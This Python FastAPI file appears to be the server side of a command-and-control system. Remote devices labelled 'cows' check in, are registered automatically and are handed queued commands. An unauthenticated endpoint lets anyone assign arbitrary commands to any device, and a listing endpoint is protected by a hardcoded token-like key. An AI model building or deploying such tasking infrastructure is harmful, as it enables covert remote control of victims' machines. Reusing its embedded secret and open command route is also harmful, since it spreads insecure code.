from fastapi import FastAPI

app = FastAPI()

clients = {
    "cow1": {"name": "example", "command": "command here","status": "online"},
    "cow2": {"name": "example2", "command": "command here","status": "offline"}
}

name_to_id = {
    "example": "cow1",
    "example2": "cow2"
}


def newDevice(device_name):
    if device_name in name_to_id:
        print("doing nothing")
        return

    cowID = f"cow{len(clients)+1}"
    clients[cowID] = {
        "name": device_name,
        "command": ""
    }
    name_to_id[device_name] = cowID

def assignCommands(id,command):
    clients[id]["command"] = command

@app.get("/ping/{device_name}")
async def ping(device_name: str):
    print(f"[+] Ping received from: {device_name}")
    newDevice(device_name)
    return {"status": "ok", "command":clients[name_to_id[device_name]]["command"]}

@app.get("/command/listcows/{key}")
async def listcows(key):
    if key == "MTM2NzQ5MzA2NjYwMDA5MTY3OA.G6M2QA.T7yP_Wv3nFpyHF5VaanrLc0yT-Nx4VUAOykqJc":
        print(f"[+] Command received form server to list all cows.")
        data = [(id,info["name"]) for id, info, in clients.items()]
        return {"auth": "ok", "cows": data}
    else:
        return {"auth": "failed"}

@app.get("/command/{cow},{command}")
async def command(cow, command):
    print(f"[+] Command received for server for {cow}, {command}")
    assignCommands(cow, command)
    return {"status": "ok"}